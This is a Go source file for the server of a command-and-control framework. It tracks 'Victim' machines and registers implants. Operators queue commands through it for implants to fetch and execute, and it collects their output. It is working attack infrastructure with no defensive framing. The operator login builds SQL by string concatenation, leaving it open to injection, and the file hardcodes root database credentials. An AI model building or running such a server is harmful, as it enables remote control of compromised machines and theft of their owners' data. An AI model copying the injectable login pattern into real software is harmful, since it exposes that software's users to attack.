package main

import (
	"crypto/sha256"
	"database/sql"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strconv"
	"sync"
	"time"

	_ "github.com/go-sql-driver/mysql"
)

var (
	outputStorage Output
	omu           sync.Mutex
)

type ListDevices struct {
	Username        string `json:"Victim.username"`
	Network         string `json:"Network.ip_address"`
	OperatingSystem string `json:"Operating_System.name"`
	CPU             string `json:"CPU.architecture"`
	GPU             string `json:"GPU.information"`
	RAM             string `json:"RAM.amount"`
	Storage         string `json:"Storage.amount"`
}

var db *sql.DB

func main() {
	var err error
	db, err = sql.Open("mysql", "root:lol.exe1@tcp(127.0.0.1:3306)/aef")
	if err != nil {
		panic(err)
	}

	var socket = "127.0.0.1:8081"
	http.HandleFunc("/registerNewImplant", registerNewImplant)
	http.HandleFunc("/fetchCommand", fetchCommand)
	http.HandleFunc("/fetchOutput", fetchOutput)
	http.HandleFunc("/getClients", getClients)
	http.HandleFunc("/getStoredOutput", getStoredOutput)
	http.HandleFunc("/operators/register", registerOperatorHandler)
	http.HandleFunc("/operators/login", loginOperatorHandler)

	fmt.Println("Listening on: " + socket)

	err = http.ListenAndServe(socket, nil)
	if err != nil {
		log.Fatal("ListenAndServe: ", err)
	}
}

type LoginRequest struct {
	Username string `json:"username"`
	Password string `json:"password"`
}

func loginOperatorHandler(w http.ResponseWriter, r *http.Request) {
	// Decode JSON request body into LoginRequest struct
	decoder := json.NewDecoder(r.Body)
	var loginRequest LoginRequest
	err := decoder.Decode(&loginRequest)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	// Hash the password
	salt := loginRequest.Username
	password := []byte(loginRequest.Password + salt)
	hashedPassword := sha256.Sum256(password)
	loginRequest.Password = hex.EncodeToString(hashedPassword[:])

	// Print out the username and password of the user
	fmt.Printf("user %s with password %s wants to log in\n", loginRequest.Username, loginRequest.Password)

	// Prepare the SQL statement
	query := "SELECT COUNT(*) FROM Operator_Login WHERE username = '" + loginRequest.Username + "' AND password = '" + loginRequest.Password + "';"
	fmt.Println(query)

	// Query the Operator_Login table to check if the user exists and if the hash value matches
	rows, err := db.Query(query)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		fmt.Println(err)
		return
	}
	defer rows.Close()

	// Get the result of the query
	var count int
	for rows.Next() {
		if err := rows.Scan(&count); err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			fmt.Println(err)
			return
		}
	}

	// Send response based on whether the user exists and if the hash value matches
	if count > 0 {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("Login successful"))
		fmt.Println("User will be logged in")
	} else {
		w.WriteHeader(http.StatusUnauthorized)
		w.Write([]byte("Invalid username or password"))
		fmt.Println("Invalid username or password")
	}

}

type OperatorRegister struct {
	FirstName   string `json:"firstName"`
	LastName    string `json:"lastName"`
	Username    string `json:"username"`
	Password    string `json:"password"`
	Email       string `json:"email"`
	PhoneNumber string `json:"phoneNumber"`
}

func registerOperatorHandler(w http.ResponseWriter, r *http.Request) {
	// Decode JSON request body into OperatorRegister struct
	decoder := json.NewDecoder(r.Body)
	var operator OperatorRegister
	err := decoder.Decode(&operator)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	// Hash the password
	salt := operator.Username
	password := []byte(operator.Password + salt)
	hashedPassword := sha256.Sum256(password)
	operator.Password = hex.EncodeToString(hashedPassword[:])
	fmt.Printf(operator.Password)

	// Prepare the SQL statement for inserting operator data
	stmt, err := db.Prepare("INSERT INTO Operator_Login (username, password, date_registered, first_name, last_name, email, phone_number, operator_id) VALUES (?, ?, ?, ?, ?, ?, ?, ?)")
	if err != nil {
		panic(err.Error())
	}
	defer stmt.Close()

	// Get the current date for date_registered field
	currentDate := time.Now().Format("2006-01-02")

	// Execute the prepared statement with operator data
	result, err := stmt.Exec(operator.Username, operator.Password, currentDate, operator.FirstName, operator.LastName, operator.Email, operator.PhoneNumber, 1)
	if err != nil {
		panic(err.Error())
	}

	// Get the ID of the inserted operator
	id, err := result.LastInsertId()
	if err != nil {
		panic(err.Error())
	}

	// Do something with the operator data
	// ...
	// Print out the operator information
	fmt.Println("First Name:", operator.FirstName)
	fmt.Println("Last Name:", operator.LastName)
	fmt.Println("Username:", operator.Username)
	fmt.Println("Password:", operator.Password)
	fmt.Println("Email:", operator.Email)
	fmt.Println("Phone Number:", operator.PhoneNumber)

	fmt.Println("Operator " + strconv.FormatInt(id, 10) + " registered successfully")

	// Send response
	w.WriteHeader(http.StatusOK)
	w.Write([]byte("Operator " + strconv.FormatInt(id, 10) + " registered successfully"))
}

func getClients(w http.ResponseWriter, r *http.Request) {

	sqlQuery := "SELECT Victim.username, Network.ip_address, Operating_System.name, CPU.architecture, GPU.information, RAM.amount, Storage.amount " + "FROM Victim " + "JOIN Network ON Victim.id = Network.victim_id " + "JOIN Operating_System ON Victim.id = Operating_System.victim_id " + "JOIN CPU ON Victim.id = CPU.victim_id " + "JOIN GPU ON Victim.id = GPU.victim_id " + "JOIN RAM ON Victim.id = RAM.victim_id " + "JOIN Storage ON Victim.id = Storage.victim_id"

	results, err := db.Query(sqlQuery)

	if err != nil {
		log.Fatal(err)
	}

	defer results.Close()

	var listDevices []ListDevices

	for results.Next() {
		var ld ListDevices
		err = results.Scan(&ld.Username, &ld.Network, &ld.OperatingSystem, &ld.CPU, &ld.GPU, &ld.RAM, &ld.Storage)
		if err != nil {
			panic(err.Error())
		}
		listDevices = append(listDevices, ld)
	}

	jsonData, err := json.Marshal(listDevices)
	if err != nil {
		panic(err.Error())
	}

	w.Header().Set("Content-Type", "application/json")
	w.Write(jsonData)

	fmt.Println(string(jsonData))

	defer results.Close()

	fmt.Println("Success!")
}

// Device represents an implant device
type Device struct {
	Name            string `json:"Name"`
	ID              string `json:"ID"`
	Username        string `json:"Username"`
	OperatorID      int    `json:"OperatorID"`
	CPUArchitecture string `json:"CPUArchitecture"`
	CPUInfo         string `json:"CPUInfo"`
	RAMInfo         int    `json:"RAMInfo"`
	Storage         int    `json:"Storage"`
	OSName          string `json:"OSName"`
	NetworkInfo     string `json:"NetworkInfo"`
	CurrentDate     string `json:"CurrentDate"`
}

func registerNewImplant(w http.ResponseWriter, r *http.Request) {
	defer r.Body.Close()
	var device Device
	decoder := json.NewDecoder(r.Body)
	err := decoder.Decode(&device)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	// Insert device into database
	stmt, err := db.Prepare("INSERT INTO Victim (username, operator_id) VALUES (?, ?)")
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}
	defer stmt.Close()

	res, err := stmt.Exec(device.Username, device.OperatorID)
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}

	victimID, err := res.LastInsertId()
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}

	stmt, err = db.Prepare("INSERT INTO CPU (architecture, victim_id) VALUES (?, ?)")
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}
	defer stmt.Close()

	_, err = stmt.Exec(device.CPUArchitecture, victimID)
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}

	stmt, err = db.Prepare("INSERT INTO GPU (information, victim_id) VALUES (?, ?)")
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}
	defer stmt.Close()

	_, err = stmt.Exec(device.CPUInfo, victimID)
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}

	stmt, err = db.Prepare("INSERT INTO RAM (amount, victim_id) VALUES (?, ?)")
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}
	defer stmt.Close()

	_, err = stmt.Exec(device.RAMInfo, victimID)
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}

	stmt, err = db.Prepare("INSERT INTO Storage (amount, victim_id) VALUES (?, ?)")
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}
	defer stmt.Close()

	_, err = stmt.Exec(device.Storage, victimID)
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}

	stmt, err = db.Prepare("INSERT INTO Operating_System (name, victim_id) VALUES (?, ?)")
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}
	defer stmt.Close()

	_, err = stmt.Exec(device.OSName, victimID)
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}

	stmt, err = db.Prepare("INSERT INTO Network (ip_address, mac_address, victim_id) VALUES (?, ?, ?)")
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}
	defer stmt.Close()

	_, err = stmt.Exec(device.NetworkInfo, "", victimID)
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}

	w.WriteHeader(http.StatusOK)
	w.Write([]byte("New implant registered successfully"))
}

type Command struct {
	Input       string `json:"Input"`
	ImplantUser string `json:"ImplantUser"`
	Operator    string `json:"Operator"`
	TimeToExec  string `json:"timeToExec"`
	Delay       string `json:"delay"`
}

var (
	mu            sync.RWMutex
	storedCommand *Command
)

func fetchCommand(w http.ResponseWriter, r *http.Request) {
	defer r.Body.Close()

	// Set the response content type to JSON
	w.Header().Set("Content-Type", "application/json")

	switch r.Method {
	case "POST":
		var command Command
		decoder := json.NewDecoder(r.Body)
		if err := decoder.Decode(&command); err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}

		mu.Lock()
		storedCommand = &command
		mu.Unlock()

		// Write the status code to the response
		w.WriteHeader(http.StatusOK)

		// Fetch command for execution on implant device
		fmt.Println("Fetching command:", command.Input, "for Implant User:", command.ImplantUser, "From Operator:", command.Operator)

	case "GET":
		mu.RLock()
		defer mu.RUnlock()

		if storedCommand == nil {
			http.Error(w, "No command available", http.StatusNotFound)
			return
		}

		jsonCommand, err := json.Marshal(storedCommand)
		if err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}

		// Write the status code to the response
		w.WriteHeader(http.StatusOK)

		// Write the JSON command to the response
		if _, err := w.Write(jsonCommand); err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}

	default:
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
}

type Output struct {
	ImplantID    string `json:"ImplantId"`
	Operator     string `json:"OperatorId"`
	Output       string `json:"Output"`
	DateFromLast string `json:"DateFromLast"`
}

func fetchOutput(w http.ResponseWriter, r *http.Request) {
	defer r.Body.Close()
	var output Output
	body, err := ioutil.ReadAll(r.Body)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	// Print the received JSON body
	fmt.Println("Received JSON body:", string(body))

	err = json.Unmarshal(body, &output)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	// Store the received output
	omu.Lock()
	outputStorage = output
	omu.Unlock()
}

func getStoredOutput(w http.ResponseWriter, r *http.Request) {
	omu.Lock()
	output := outputStorage
	omu.Unlock()

	responseData, err := json.Marshal(output)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	fmt.Println(string(responseData))
	w.Header().Set("Content-Type", "application/json")
	w.Write(responseData)
}
